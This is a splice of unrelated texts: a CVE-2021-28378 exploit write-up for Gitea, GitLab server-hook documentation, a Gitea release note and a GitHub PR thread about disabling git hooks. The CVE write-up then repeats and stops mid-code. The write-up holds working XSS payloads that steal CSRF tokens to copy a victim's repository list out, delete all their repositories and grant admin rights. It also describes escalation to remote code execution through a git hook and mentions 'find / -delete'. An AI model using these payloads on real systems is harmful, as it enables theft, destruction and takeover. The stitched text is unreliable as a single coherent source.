# CVE-2021-28378

Details about this CVE [here](https://www.cvedetails.com/cve/CVE-2021-28378/).

This CVE targets a missing string escaping on the client-side from content fetched from the server.
It enables an attacker to inject arbitrary code easily, by creating a comment on an issue or a pull request.
This was introduced in commit [7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5](https://github.com/go-gitea/gitea/commit/7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5), by the end of Jan 2020, but because of a squash we can't exactly know who did this to investigate for similar bugs introduced (or backdoor, depending on how we see this).

First of all, let's understand where this vulnerability come from. For that, let's see [the commit that fixes this CVE](https://github.com/go-gitea/gitea/pull/14898/commits/1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab).

Before:

* First:

```
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
```

* Second:

```
    html: `
<div>
    <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${issue.title}</strong> #${index}</p>
    <p>${body}</p>
    ${labels}
</div>
`
```

We can see there is not any html escaping on `label.name`, `issue.repository.full_name`, `issue.title` and `body`, which are strings a user can manipulate, and so, inject arbitrary code.
Notice the `issue.repository.full_name` cannot really be manipulated to inject code while it has to follow too many rules (`[\w._-]+`) that we cannot bypass with this CVE.
This is exactly what the PR fixes by casting them into `htmlEscape`.

After:

* First:

```
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${htmlEscape(label.name)}</div>`;
```

* Second:

```
    html: `
<div>
    <p><small>${htmlEscape(issue.repository.full_name)} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${htmlEscape(issue.title)}</strong> #${index}</p>
    <p>${htmlEscape(body)}</p>
    ${labels}
</div>
`
```

## Understanding the vulnerability

Let's take a quick look at the file `web_src/js/features/contextpopup.js`, to figure out how to trigger the CVE.

```
...
const {AppSubUrl} = window.config;

export default function initContextPopups() {
  const refIssues = $('.ref-issue');
  if (!refIssues.length) return;

  refIssues.each(function () {
    const [index, _issues, repo, owner] = $(this).attr('href').replace(/[#?].*$/, '').split('/').reverse();
    issuePopup(owner, repo, index, $(this));
  });
}

function issuePopup(owner, repo, index, $element) {
  $.get(`${AppSubUrl}/api/v1/repos/${owner}/${repo}/issues/${index}`, (issue) => {
...
    for (let i = 0; i < issue.labels.length; i++) {
...
      labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
    }
...

    $element.popup({
      variation: 'wide',
      delay: {
        show: 250
      },
      html: `
<div>
  <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
  <p><span class="${color}">${svg(octicon, 16)}</span> <strong>${issue.title}</strong> #${index}</p>
  <p>${body}</p>
  ${labels}
</div>
`
    });
  });
}
```

What we see there is that for each node with the class `ref-issue`, we will add a vulnerable popup.
Now, we need to find where a `ref-issue` is sent to the user: let's grep (and keep only interesting results, so not any test files or similar ones) !
The following commit number corresponds to the 1.12.4 tag, the default version from the official `docker-compose.yml` file, which is affected by this CVE.

```
cd gitea
git checkout 8a51c48eb6367513e0518bcd412e64f6cbfe5e1a
grep -r ref-issue

modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))
modules/markup/html.go:		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
modules/markup/html.go:		link = createLink(com.Expand(ctx.metas["format"], ctx.metas), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ctx.metas["user"], ctx.metas["repo"], path, ref.Issue), reftext, "ref-issue")
modules/markup/html.go:			link = createLink(util.URLJoin(setting.AppURL, ref.Owner, ref.Name, path, ref.Issue), reftext, "ref-issue")
modules/markup/sanitizer.go:	sanitizer.policy.AllowAttrs("class").Matching(regexp.MustCompile(`ref-issue`)).OnElements("a")
```

We now know there is no static content with the class `ref-issue`, but it's dynamically generated.
The last is not interesting while it's just a sanitizer policy rule. The others are interesting, we'll see why.

Let's dive into `modules/markup/html.go`.

```
func fullIssuePatternProcessor(ctx *postProcessCtx, node *html.Node) {
	if ctx.metas == nil {
		return
	}
	m := getIssueFullPattern().FindStringSubmatchIndex(node.Data)
	if m == nil {
		return
	}
	link := node.Data[m[0]:m[1]]
	id := "#" + node.Data[m[2]:m[3]]

	// extract repo and org name from matched link like
	// http://localhost:3000/gituser/myrepo/issues/1
	linkParts := strings.Split(path.Clean(link), "/")
	matchOrg := linkParts[len(linkParts)-4]
	matchRepo := linkParts[len(linkParts)-3]

	if matchOrg == ctx.metas["user"] && matchRepo == ctx.metas["repo"] {
		// TODO if m[4]:m[5] is not nil, then link is to a comment,
		// and we should indicate that in the text somehow
		replaceContent(node, m[0], m[1], createLink(link, id, "ref-issue"))

	} else {
		orgRepoID := matchOrg + "/" + matchRepo + id
		replaceContent(node, m[0], m[1], createLink(link, orgRepoID, "ref-issue"))
	}
}
```

We'll also need to understand what `getIssueFullPattern` does.

```
func getIssueFullPattern() *regexp.Regexp {
	if issueFullPattern == nil {
		appURL := setting.AppURL
		if len(appURL) > 0 && appURL[len(appURL)-1] != '/' {
			appURL += "/"
		}
		issueFullPattern = regexp.MustCompile(appURL +
			`\w+/\w+/(?:issues|pulls)/((?:\w{1,10}-)?[1-9][0-9]*)([\?|#]\S+.(\S+)?)?\b`)
	}
	return issueFullPattern
}
```

Let's sum up to understand what job is done there.

In `fullIssuePatternProcessor`, we first need to be sure that `ctx.metas` is not nil (what we assume being true while it's built by higher functions/methods in the stack trace).
Then we check if the node data matches a path like `http://mygitea.com/gituser/myrepo/issues/1`. If there is a match, we then replace it by a link.
If the link is about the same user and repo, replace it by the `#<issue_id>` pattern, else by `<user>/<repo>#<issue_id>`.
In those both cases, we have a `ref-issue` class that is added to generate the popup.

The other catch does kind of the same thing.

## Time to play !

Now we have the context, which is about replacing a link like `http://mygitea.com/gituser/myrepo/issues/1` by a shorter link, we can deduce where such job is achieved: in issues and PR, where you can add a label on and/or post a comment.

For this, let's assume you've got a repository with write permissions.

### Label

Go to your repository, and create a new label with a name containing arbitrary code (such as `<script>alert('label.name')</script>`).

### Issue

Go to your repository issues, and create a new issue with arbitrary code in the title and the body, and add it the previous label.

### Let's execute some code

Create a new issue on any repository, and add in its body a link to your injected issue such as `http://mygitea.com/gituser/myrepo/issues/1`.
It will be replaced by the link we previously saw, and when someone will put his mouse over the link, the arbitrary code will get run: a popup is displayed embedding `label.name`.

## Exploit-time

The CVE-2021-28378 is proven being able to enable arbitrary code injection.
Let's imagine what an attacker could do.

On Gitea, you have a CSRF token which asserts your identity when filling forms and/or calling the API, preventing security issues like embedding a Gitea iframe to steal your accesses.
The CSRF token stored in your cookies (`_csrf`), but also in pretty much all the webpages (except some like `/api/v1/swagger`) a user visits under some fields... And so on the issues/PR webpages.
The most interesting field containing it is inside the common header part of the HTML pages, always with the same XPath: `/html/head/meta[9]`.

With this data, we can now send authenticated actions from any user affected by our payload, by simply getting the CSRF token in JS, with the following: `(document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content`.

Now, it's time to use your creativity to build various attacks.
Notice you'll be limited in your actions, but not that much:

* the `label.name` and `issue.title` must be short, and so not many payloads will fit. Nevertheless, you can inject a `script` with a `src` attribute that will reference any script you want.
* the `body` is not limited in length, but the preview of the popup doesn't load so much data. Your payload will have to be at the beginning if you want it to get triggered. Nevertheless, you can do as specified previously with a `script` and a `src` attribute.

Let's have a look at some examples you can build.

### Get all the repositories of a user

Imagine the scenario where an attacker wants to get all the repositories you have access to. It proves the attack can break all your confidentiality.
This attack is achieved in 3 steps:

* steal the CSRF token ;
* get the list of the repositories ;
* create a new ticket with the raw JSON content of the previous step.

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";
var HackerRepo = "/hacker/mysaferepo"

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        var xhrPost = new XMLHttpRequest();
        xhrPost.open("POST", AppURL + HackerRepo + "/issues/new", true);
        xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhrPost.send("_csrf=" + CSRF + "&title=Title&content=" + xhrGet.responseText);
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the link, he's got all his repositories data stolen by the attacker !

### Delete all the repositories a user has access to

Imagine the scenario where an attacker wants to delete all your repositories you have access to. It proves the attack can break all your integrity.
This attack is achieved in 3 steps:

* steal the CSRF token ;
* get the list of the repositories ;
* for each repository, delete it (at least try).

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhrGet = new XMLHttpRequest();
xhrGet.responseType = "json";
xhrGet.open("GET", AppURL + "/api/v1/repos/search", true);
xhrGet.onload = function() {
    if (xhrGet.readyState === XMLHttpRequest.DONE) {
        data = xhrGet.response.data;
        data.forEach(repo => {
            var xhrPost = new XMLHttpRequest();
            xhrPost.open("POST", repo.html_url + "/settings", true);
            xhrPost.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhrPost.send("_csrf=" + CSRF + "&action=delete&repo_name=" + repo.name)
        });
    }
}
xhrGet.send(null);
```

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone put his mouse over the reference, all the repositories he has access to gets deleted !

### Get the admin rights

Imagine the scenario where an attacker wants to get the admin rights. This proves a Privilege Escalation is possible.
This attack is achieved in 2 steps:

* steal the CSRF token ;
* give admin rights to the attacker (at least try).

Let's write some JS code to do this:

```
var AppURL = "http://mygitea.com";
var HackerID = "1";
var HackerEmail = "hacker@example.com";

var CSRF = (document.evaluate("/html/head/meta[9]", document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue).content;

var xhr = new XMLHttpRequest();
xhr.open("POST", AppURL + "/admin/users/" + HackerID);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("_csrf=" + CSRF + "&login_type=0-0&login_name=&full_name=&email=" + encodeURIComponent(HackerEmail) + "&password=&website=&location=&max_repo_creation=-1&active=on&admin=on&allow_git_hook=on&allow_create_organization=on");
```

Notice the value of `login_type` can change according to your Gitea version and the way your instance handles login.

Put this payload in its own file, upload it on your repo and inject it in an issue body using something like `<script src="http://mygitea.com/hacker/mysaferepo/raw/branch/master/exploit.js"></script>`.

Now the attacker can comment an issue/PR referencing this injected issue, and when someone with enough rights puts his mouse over the reference, the attacker gets granted admin rights ! He can also assigne the issue to an admin, or create the issue on a repo an admin is watching (so he'll get a notification) to increase its chances.

### Get a RCE

The """funniest""" part with Gitea is that security considerations where not part of the process, by implementing git hooks. It's probably one of the worst idea you could implement.

Once you have admin rights, you can grant you the privilege to manage git hooks (what is achieved with the previous payload). Procede as the [Gitea Git Hooks Remote Code Execution Metasploit module](https://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html) does:

* add your bash payload into the `post-receive` git-hook ;
* commit and push something, even if it's empty ;
* check the effect of the payload.

To make sure this RCE is valid, let's put the following, with a valid `id`.

```
#!/bin/bash

curl https://requestbin.net/r/<id>
```

In the RequestBin inspection panel, after we submit a file that triggers the `post-receive` git hook, we see that a request was achieved with a `User-Agent: curl/<version>` which proves it is a valid RCE.

Notice this functionnality implies that for every XSS that can get triggered by an admin, as long as there will be the `_csrf` value embeded in pretty much all the webpages, you can get a RCE on Gitea.

## How to prevent

Do your updates according to the CVE affected versions (refers to the an official report). At the time of writing: 1.12.0 to 1.13.4 (excluded).

## Notes

Here is a list of affected versions and their test status. Notice for 1.13.X versions, you'll have to add `DISABLE_GIT_HOOKS = false` in the `app.ini` file under section `[security]`, which could be located at `data/gitea/conf/app.ini`, depending on where your data folder is (for the `docker-compose.yml` file documented on [DockerHub](https://hub.docker.com/r/gitea/gitea), it'll in the same folder).

| Version | XSS | RCE |
| --- | --- | --- |
| 1.12.0 | ✅ | ✅ |
| 1.12.1 | ✅ | ✅ |
| 1.12.2 | ✅ | ✅ |

This sheet is made to guide the reader into score calculation: it's only to discuss about scoring, and is not to take as an order.

| Metric | Value | Explanation |
| --- | --- | --- |
| AV | AV:N | Uses HTTP to interact. |
| AC | AC:L | Only needs an issue (by default on Gitea it's really easy to file one because it's enabled to everyone) or a pull request. |
| PR | PR:L | In most contexts, needs an account to create an issue (by default, you can register new accounts). All the accounts can create an issue on a read-only repository, expect in case the repo has been configured to avoid issues (which is not the default setting and rarely modified). |
| UI | UI:R | An user or admin has to put his mouse over the infected link to triggers a payload. |
| S | S:C | With the RCE, you have access to the host machine and so everything on it (except in case Gitea has been perfectly isolated, what is not officially documented or even discussed, and cannot be proved being perfect). |
| C | C:H | Once you've got the admin rights, you can manage everything even if it has been configured private. You are able to steal database credentials, connect to it using the RCE and extract data. With the RCE, you can directly read the file system, where no authentication/authorization checks are achieved by Gitea. |
| I | I:H | Once you've got the admin rights, you can modify rights, visibility, change the repository code, even delete the repository. With the RCE, you're free to dive into everything and so impact the integrity of users, files... |
| A | A:H | Given the RCE, you can simply delete the whole file system with a `find / -delete`, causing a total loss of availability. |
| E | E:H | Given the python script `exploit.py`, you can completly run the attack from bare to a reverse shell. |
| RL | RL:O | Fixed by commit `<1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab>`, merged into master and so into Gitea 1.13.4. |
| RC | RC:C | This report confirms and shows multiple exploits, from the XSS origin analysis to a RCE example and autonomous script. |
| MAV | MAV:N | Uses HTTP to interact, but with the RCE you can uses other protocols. |
| MAC | MAC:L | Once you've got a reverse shell using the RCE, you're free to play on the host. |
| MPR | MPR:L | Once you've got a reverse shell using the RCE, you have the rights inherited from the user that ran it. Considering that you are now in the server file system, you have access to pretty much everything on it, including secrets in case there are some (to connect to the DB, an AD or even a Drone CI) only by reading env variables or `data/gitea/conf/app.ini`. |
| MUI | MUI:N | Once you've got the RCE, you can implement a backdoor so no further user interaction will be needed, and the attacker account can be deleted to hide the tracks. |
| MS | MS:C | With the RCE and a reverse shell/backdoor, you are free to go on the host server, steal tokens to connect to other authorities...etc. |
| MC | MC:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| MI | MI:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| MA | MA:H | Given the RCE, you are free to play on the host server, and so on the whole Gitea instance and everything that is in its environment (file system, other authorities, processes...). |
| CR | CR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| IR | IR:H | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... |
| AR | AR:M | Given the RCE, you are free to play on the host server. Even if it's a Docker container, Gitea doc does not explain how to isolate it, so it will be possible to affect host processes with the non-remapped PIDs, there is no seccomp so you can change Gitea source code easily, no quota so you can DoS the host server, no capabilities list is set so you can do every Docker call you want... While you don't host customer/internal services directly on the Gitea instance, you won't catastrophically affect them, but you'll be able to stop their business to get updated. With a bit of luck, in case you are delivering from Gitea with the Git hooks you can still dramatically stop their business from running. |

# Git server hooks

**Tier:** Free, Premium, Ultimate
**Offering:** GitLab Self-Managed
**History**

* [Renamed](https://gitlab.com/gitlab-org/gitlab/-/issues/372991) from server hooks to Git server hooks in GitLab 15.6.

Git server hooks (not to be confused with [system hooks](system_hooks.html) or [file hooks](file_hooks.html)) run custom logic
on the GitLab server. You can use them to run Git-related tasks such as:

* Enforcing specific commit policies.* Performing tasks based on the state of the repository.

Git server hooks use `pre-receive`, `post-receive`, and `update`
[Git server-side hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks#_server_side_hooks).

GitLab administrators configure server hooks using the `gitaly` command, which also:

* Is used to launch a Gitaly server.* Provides several subcommands.* Connects to the Gitaly gRPC API.

If you don’t have access to the `gitaly` command, alternatives to server hooks include:

* [Webhooks](../user/project/integrations/webhooks.html).* [GitLab CI/CD](../ci/index.html).* [Push rules](../user/project/repository/push_rules.html), for a user-configurable Git hook interface.

[Geo](geo/index.html) doesn’t replicate server hooks to secondary nodes.
## Set server hooks for a repository

GitLab 15.11 and later
**History**

* [Introduced](https://gitlab.com/gitlab-org/gitaly/-/issues/4629) in GitLab 15.11, `hooks set` command replaces direct file system access. Existing Git hooks don’t need migrating for the `hooks set` command.

Prerequisites:

* The [storage name](gitaly/configure_gitaly.html#gitlab-requires-a-default-repository-storage), path to the Gitaly configuration file
  (default is `/var/opt/gitlab/gitaly/config.toml` on Linux package instances), and the
  [repository relative path](repository_storage_paths.html#from-project-name-to-hashed-path) for the repository.* Any language runtimes and utilities that are required by the hooks must be installed on each of the servers that run Gitaly.

To set server hooks for a repository:

1. Create tarball containing custom hooks:
   1. Write the code to make the server hook function as expected. Git server hooks can be in any programming language.
      Ensure the [shebang](https://en.wikipedia.org/wiki/Shebang_%28Unix%29) at the top reflects the language type. For
      example, if the script is in Ruby the shebang is probably `#!/usr/bin/env ruby`.
      * To create a single server hook, create a file with a name that matches the hook type. For example, for a
        `pre-receive` server hook, the filename should be `pre-receive` with no extension.* To create many server hooks, create a directory for the hooks that matches the hook type. For example, for a
          `pre-receive` server hook, the directory name should be `pre-receive.d`. Put the files for the hook in that
          directory.- Ensure the server hook files are executable and do not match the backup file pattern (`*~`). The server hooks be
        in a `custom_hooks` directory that is at the root of the tarball.- Create the custom hooks archive with the tar command. For example, `tar -cf custom_hooks.tar custom_hooks`.- Run the `hooks set` subcommand with required options to set the Git hooks for the repository. For example,
     `cat custom_hooks.tar | sudo -u git -- /opt/gitlab/embedded/bin/gitaly hooks set --storage <storage> --repository <relative path> --config <config path>`.
     * A path to a valid Gitaly configuration for the node is required to connect to the node and provided to the `--config` flag.* Custom hooks tarball must be passed via `stdin`. For example, `cat custom_hooks.tar | sudo -u git -- /opt/gitlab/embedded/bin/gitaly hooks set --storage <storage> --repository <relative path> --config <config path>`.- If you are using Gitaly Cluster, you must run `hooks set` subcommand on all Gitaly nodes. For more information, see
       [Server hooks on a Gitaly Cluster](#server-hooks-on-a-gitaly-cluster).

If you implemented the server hook code correctly, it should execute when the Git hook is next triggered.
GitLab 15.10 and earlier

To create server hooks for a repository:

1. On the left sidebar, at the bottom, select **Admin**.- Go to **Overview > Projects** and select the project you want to add a server hook to.- On the page that appears, locate the value of **Relative path**. This path is where server
       hooks must be located.
       * If you are using [hashed storage](repository_storage_paths.html#hashed-storage), see
         [Translate hashed storage paths](repository_storage_paths.html#translate-hashed-storage-paths) for information on
         interpreting the relative path.* If you are not using [hashed storage](repository_storage_paths.html#hashed-storage):
           + For Linux package installations, the path is usually `/var/opt/gitlab/git-data/repositories/<group>/<project>.git`.+ For self-compiled installations, the path is usually `/home/git/repositories/<group>/<project>.git`.- On the file system, create a new directory in the correct location called `custom_hooks`.- In the new `custom_hooks` directory:
           * To create a single server hook, create a file with a name that matches the hook type. For example, for a
             `pre-receive` server hook, the filename should be `pre-receive` with no extension.* To create many server hooks, create a directory for the hooks that matches the hook type. For example, for a
               `pre-receive` server hook, the directory name should be `pre-receive.d`. Put the files for the hook in that directory.- **Make the server hook files executable** and ensure that they are owned by the Git user.- Write the code to make the server hook function as expected. Git server hooks can be in any programming language. Ensure
               the [shebang](https://en.wikipedia.org/wiki/Shebang_%28Unix%29) at the top reflects the language type. For
               example, if the script is in Ruby the shebang is probably `#!/usr/bin/env ruby`.- Ensure the hook file does not match the backup file
                 pattern (`*~`).- If you are using Gitaly Cluster, you must repeat this process on all Gitaly nodes. For more information, see
                   [Server hooks on a Gitaly Cluster](#server-hooks-on-a-gitaly-cluster).

If the server hook code is properly implemented, it should execute when the Git hook is next triggered.

### Server hooks on a Gitaly Cluster

If you use [Gitaly Cluster](gitaly/index.html), an individual repository may be replicated to multiple Gitaly storages in Praefect.
Consequentially, the hook scripts must be copied to every Gitaly node that has a replica of the repository.
To accomplish this, follow the same steps for setting custom repository hooks for the applicable version and repeat for each storage.

The location to copy the scripts to depends on where repositories are stored:

* In GitLab 15.2 and earlier, Gitaly Cluster uses the [hashed storage path](repository_storage_paths.html#hashed-storage)
  reported by the GitLab application.* In GitLab 15.3 and later, new repositories are created using
    [Praefect-generated replica paths](gitaly/index.html#praefect-generated-replica-paths),
    which are not the hashed storage path. The replica path can be identified by
    [querying the Praefect repository metadata](../administration/gitaly/troubleshooting_gitaly_cluster.html#view-repository-metadata)
    using `-relative-path` to specify the expected GitLab hashed storage path.

## Create global server hooks for all repositories

To create a Git hook that applies to all repositories, set a global server hook. Global server hooks also apply to:

* [Project and group wiki](../user/project/wiki/index.html) repositories. Their storage directory names are in the format
  `<id>.wiki.git`.* [Design management](../user/project/issues/design_management.html) repositories under a project. Their storage directory
    names are in the format `<id>.design.git`.

### Choose a server hook directory

Before creating a global server hook, you must choose a directory for it.

For Linux package installations, the directory is set in `gitlab.rb` under `gitaly['configuration'][:hooks][:custom_hooks_dir]`. You can either:

* Use the default suggestion of the `/var/opt/gitlab/gitaly/custom_hooks` directory by uncommenting it.* Add your own setting.

For self-compiled installations:

* The directory is set in `gitaly/config.toml` under the `[hooks]` section. However,
  GitLab honors the `custom_hooks_dir` value in `gitlab-shell/config.yml` if the value in `gitaly/config.toml` is blank
  or non-existent.* The default directory is `/home/git/gitlab-shell/hooks`.

### Create the global server hook

To create a global server hook for all repositories:

1. On the GitLab server, go to the configured global server hook directory.- In the configured global server hook directory, create a directory for the hooks that matches the hook type. For example, for a `pre-receive` server hook, the directory name should be `pre-receive.d`.- Inside this new directory, add your server hooks. Git server hooks can be in any programming language. Ensure the
       [shebang](https://en.wikipedia.org/wiki/Shebang_%28Unix%29) at the top reflects the language type. For example, if the
       script is in Ruby the shebang is probably `#!/usr/bin/env ruby`.- Make the hook file executable, ensure that it’s owned by the Git user, and ensure it does not match the backup file
         pattern (`*~`).

If the server hook code is properly implemented, it should execute when the Git hook is next triggered. Hooks are executed in alphabetical order by filename in the hook type
subdirectories.
## Remove server hooks for a repository

GitLab 15.11 and later
**History**

* [Introduced](https://gitlab.com/gitlab-org/gitaly/-/issues/4629) in GitLab 15.11, `hooks set` command replaces direct file system access.

Prerequisites:

* The [storage name and relative path](repository_storage_paths.html#from-project-name-to-hashed-path) for the repository.

To remove server hooks, pass an empty tarball to `hook set` to indicate that the repository should contain no hooks. For example:
```
cat empty_hooks.tar | sudo -u git -- /opt/gitlab/embedded/bin/gitaly hooks set --storage <storage> --repository <relative path> --config <config path>

```

GitLab 15.10 and earlier

To remove server hooks:

1. Go to the location of the repository on disk.- Delete the server hooks in the `custom_hooks` directory.

## Chained server hooks

GitLab can execute server hooks in a chain. GitLab searches for and executes server hooks in the following order:

* Built-in GitLab server hooks. These server hooks are not customizable by users.* `<project>.git/custom_hooks/<hook_name>`: Per-project hooks. This location is kept for backwards compatibility.* `<project>.git/custom_hooks/<hook_name>.d/*`: Location for per-project hooks.* `<custom_hooks_dir>/<hook_name>.d/*`: Location for all executable global hook files except editor backup files.

Within a server hooks directory, hooks:

* Are executed in alphabetical order.* Stop executing when a hook exits with a non-zero value.

## Environment variables available to server hooks

You can pass any environment variable to server hooks, but you should only rely on supported environment variables.

The following GitLab environment variables are supported for all server hooks:

| Environment variable Description| `GL_ID` GitLab identifier of user or SSH key that initiated the push. For example, `user-2234` or `key-4`.| `GL_PROJECT_PATH` GitLab project path.| `GL_PROTOCOL` Protocol used for this change. One of: `http` (Git `push` using HTTP), `ssh` (Git `push` using SSH), or `web` (all other actions).| `GL_REPOSITORY` `project-<id>` where `id` is the ID of the project.| `GL_USERNAME` GitLab username of the user that initiated the push. | | | | | | | | | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

The following Git environment variables are supported for `pre-receive` and `post-receive` server hooks:

| Environment variable Description| `GIT_ALTERNATE_OBJECT_DIRECTORIES` Alternate object directories in the quarantine environment. See [Git `receive-pack` documentation](https://git-scm.com/docs/git-receive-pack#_quarantine_environment).| `GIT_OBJECT_DIRECTORY` GitLab project path in the quarantine environment. See [Git `receive-pack` documentation](https://git-scm.com/docs/git-receive-pack#_quarantine_environment).| `GIT_PUSH_OPTION_COUNT` Number of [push options](../topics/git/commit.html#push-options). See [Git `pre-receive` documentation](https://git-scm.com/docs/githooks#pre-receive).| `GIT_PUSH_OPTION_<i>` Value of [push options](../topics/git/commit.html#push-options) where `i` is from `0` to `GIT_PUSH_OPTION_COUNT - 1`. See [Git `pre-receive` documentation](https://git-scm.com/docs/githooks#pre-receive). | | | | | | | | | --- | --- | --- | --- | --- | --- | --- | --- | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

## Custom error messages

You can have custom error messages appear in the GitLab UI when a commit is declined or an error occurs during the Git
hook. To display a custom error message, your script must:

* Send the custom error messages to either the script’s `stdout` or `stderr`.* Prefix each message with `GL-HOOK-ERR:` with no characters appearing before the prefix.

For example:
```
#!/bin/sh
echo "GL-HOOK-ERR: My custom error message.";
exit 1

```

[v1.22.0](/go-gitea/gitea/releases/tag/v1.22.0)

This release stands as a monumental milestone in our development journey with a record-breaking incorporation of [1481](https://github.com/go-gitea/gitea/pulls?q=is%3Apr+milestone%3A1.22.0+is%3Amerged) pull requests. It marks the most extensive update in Gitea's history, showcasing a plethora of new features and infrastructure improvements.

Noteworthy advancements in this release include the introduction of `HTMX` and `Tailwind`, signaling a strategic shift as we gradually phase out `jquery` and `Fomantic UI`. These changes reflect our commitment to embracing modern technologies and enhancing the user experience.

Key highlights of this release encompass significant changes categorized under `BREAKING`, `FEATURES`, `ENHANCEMENTS`, and `PERFORMANCE`, each contributing to a more robust and efficient Gitea platform.

### @Niklas974 **[Niklas974](/Niklas974)** commented [Oct 7, 2020](#issue-716327950)

Git hooks are a dangerous feature that allows users with the relevant privilege to perform remote code execution on the host system and elevate their privileges to gitea administrator. Details are provided in the [vulnerability report](https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1124-und-gogs-0121-ermoeglicht-ausfuehrung-von-code-nach-authent/).

This pull request thus:

* disables the git hook feature by default
* improves documentation on it
* Extends the warning tooltip that is shown when giving git hook privileges to

The problem was first reported to the gitea security team in April who released a patch. In our opinion this patch only partly mitigates the vulnerability, though. For details see the report linked above.

Sorry, something went wrong.

| Thanks for merging this quickly!  I suggest to add a warning for the next release. Disabling the git hook feature by default will affect the settings on existing gitea instances, admins of existing gitea instances should be informed about the issue to be able to change the setting on their instance if needed. |

| [@Niklas974](https://github.com/Niklas974) All break changes will be displayed on release notes.  The change in the default config in this PR (DISABLE\_GIT\_HOOKS = true) should only affect new installations for gitea. Thus in existing installations, git hooks will stay as they were (mostly enabled, I guess). These existing installations are still endangered, thus I think the admins should be warned in the release notes.  Or am I missing something, here? |

# CVE-2021-28378

Details about this CVE [here](https://www.cvedetails.com/cve/CVE-2021-28378/).

This CVE targets a missing string escaping on the client-side from content fetched from the server.
It enables an attacker to inject arbitrary code easily, by creating a comment on an issue or a pull request.
This was introduced in commit [7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5](https://github.com/go-gitea/gitea/commit/7d7ab1eeae43d99fe329878ac9c8db5e45e2dee5), by the end of Jan 2020, but because of a squash we can't exactly know who did this to investigate for similar bugs introduced (or backdoor, depending on how we see this).

First of all, let's understand where this vulnerability come from. For that, let's see [the commit that fixes this CVE](https://github.com/go-gitea/gitea/pull/14898/commits/1e3c3388fb82235d9f3d63a0bad62ca3ff4682ab).

Before:

* First:

```
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${label.name}</div>`;
```

* Second:

```
    html: `
<div>
    <p><small>${issue.repository.full_name} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${issue.title}</strong> #${index}</p>
    <p>${body}</p>
    ${labels}
</div>
`
```

We can see there is not any html escaping on `label.name`, `issue.repository.full_name`, `issue.title` and `body`, which are strings a user can manipulate, and so, inject arbitrary code.
Notice the `issue.repository.full_name` cannot really be manipulated to inject code while it has to follow too many rules (`[\w._-]+`) that we cannot bypass with this CVE.
This is exactly what the PR fixes by casting them into `htmlEscape`.

After:

* First:

```
    labels += `<div class="ui label" style="color: ${color}; background-color:#${label.color};">${htmlEscape(label.name)}</div>`;
```

* Second:

```
    html: `
<div>
    <p><small>${htmlEscape(issue.repository.full_name)} on ${createdAt}</small></p>
    <p><span class="${color}">${svg(octicon)}</span> <strong>${htmlEscape(issue.title)}</strong> #${index}</p>
    <p>${htmlEscape(body)}</p>
    ${labels}
</div>
`
```

## Understanding the vulnerability

Let's take a quick look at the file `web_src/js/features/contextpopup.js`, to figure out how to trigger the CVE.

```
...
const {AppSubUrl} = window.config;

export default function initContextPopups() {
  const refIssues = $('.ref-issue');
  if (!refIssues.length) return;

  refIssues.each(function () {
